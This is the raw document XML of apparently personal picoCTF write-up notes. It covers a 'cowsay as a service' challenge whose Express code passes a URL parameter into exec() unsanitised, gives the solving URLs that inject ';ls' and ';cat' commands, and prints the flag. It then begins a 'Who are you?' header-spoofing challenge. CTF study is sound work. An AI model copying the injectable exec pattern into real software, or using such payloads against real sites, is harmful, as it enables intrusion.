          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> as a service</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C912D6" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00000000" w:rsidP="00B335C0">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="212121"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:pict w14:anchorId="365831FF">
          <v:rect id="_x0000_i1025" style="width:0;height:0" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="6966" w:type="dxa"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5072"/>
        <w:gridCol w:w="1894"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B335C0" w14:paraId="2D4E9D7E" w14:textId="77777777" w:rsidTr="00B335C0">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:tblHeader/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="180" w:type="dxa"/>
              <w:left w:w="105" w:type="dxa"/>
              <w:bottom w:w="180" w:type="dxa"/>
              <w:right w:w="105" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59E47AFA" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:caps/>
                <w:color w:val="212121"/>
                <w:sz w:val="19"/>
                <w:szCs w:val="19"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:caps/>
                <w:color w:val="212121"/>
                <w:sz w:val="19"/>
                <w:szCs w:val="19"/>
              </w:rPr>
              <w:t>CHALLENGE ENDPOINTS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B335C0" w14:paraId="4183D2E9" w14:textId="77777777" w:rsidTr="00B335C0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="180" w:type="dxa"/>
              <w:left w:w="105" w:type="dxa"/>
              <w:bottom w:w="180" w:type="dxa"/>
              <w:right w:w="105" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BFCA7FE" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00B335C0">
            <w:pPr>
              <w:rPr>
                <w:color w:val="212121"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="212121"/>
              </w:rPr>
              <w:t>Download index.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="180" w:type="dxa"/>
              <w:left w:w="105" w:type="dxa"/>
              <w:bottom w:w="180" w:type="dxa"/>
              <w:right w:w="105" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66C57E1C" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:color w:val="212121"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId80" w:tgtFrame="_blank" w:history="1">
              <w:r w:rsidR="00B335C0">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:color w:val="5969F6"/>
                </w:rPr>
                <w:t>index.js</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="592FD860" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>const express = require('express');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8CCECB" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>const app = express();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E5F527" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>const { exec } = require('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>child_process</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FA7D83" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FADC1BD" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>app.use</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>express.static</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>('public'));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EE3D82" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69BA99DD" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>app.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>('/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>cowsay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/:message', (req, res) =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AD93DE" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>exec(`/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/games/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>cowsay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> ${</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>req.params.message</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>}`,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> {timeout: 5000}, (error, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>stdout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>) =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0E8AA8" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (error) return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>res.status</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(500).end();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EA3529" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>res.type</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>('txt').send(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>stdout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>).end();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78062F79" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20581D09" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F5EA148" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5E3E25" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>app.listen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(3000, () =&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6682D600" w14:textId="77777777" w:rsidR="00B335C0" w:rsidRPr="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  console.log('listening');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F835A86" w14:textId="16EDF776" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423B1A6C" w14:textId="18FF624C" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Command injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E77D9D" w14:textId="2CC6515D" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>%20 -&gt; white space</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B19974" w14:textId="0ABB98F4" w:rsidR="00B335C0" w:rsidRDefault="00B335C0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B335C0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>https://caas.mars.picoctf.net/cowsay/hellow;%20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ls-l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186AB9A1" w14:textId="26591327" w:rsidR="00B335C0" w:rsidRDefault="00000000" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId81" w:history="1">
        <w:r w:rsidR="00A226E0" w:rsidRPr="001B2A6B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>https://caas.mars.picoctf.net/cowsay/hellow;%20cat%20falg.txt</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6671AE4E" w14:textId="1887CF57" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D29EB83" w14:textId="413A8E2D" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="246C4DEF" wp14:editId="69F67D26">
            <wp:extent cx="5128704" cy="159271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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5128704" cy="1592718"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6D37B3" w14:textId="3EFEC8AF" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F65C8C0" w14:textId="31036EA0" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB7AF83" w14:textId="00D5280F" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00B335C0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4875FBA3" w14:textId="21AFBECA" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Who are you?</w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00E45D20">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>HARD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71436DF5" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> | 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DE56BA" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B1E7D2" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>AUTHOR: MADSTACKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521763B7" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66594A0E" w14:textId="77777777" w:rsidR="00A226E0" w:rsidRPr="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6E777B" w14:textId="06FFC481" w:rsidR="00A226E0" w:rsidRDefault="00A226E0" w:rsidP="00A226E0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Let me in. Let me </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>iiiiiiinnnnnnnnnnnnnnnnnnnn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A226E0">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId83" w:history="1">
        <w:r w:rsidR="00BE6C96" w:rsidRPr="001B2A6B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:1270/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="73C9C16D" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C96">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="Times New Roman" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>Presentation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0E6504"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objective is to pretend to be a user who is accepted by the site to obtain the page with the flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29460C04"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Flaw to be exploited</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F47CCD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flaw exploited is in the HTTP request, and more precisely in the headers thereof, which we send to the server that we can modify and which allows us to access the different pages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00896631" w14:textId="77777777" w:rsidR="00BE6C96" w:rsidRDefault="00BE6C96" w:rsidP="00BE6C96">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
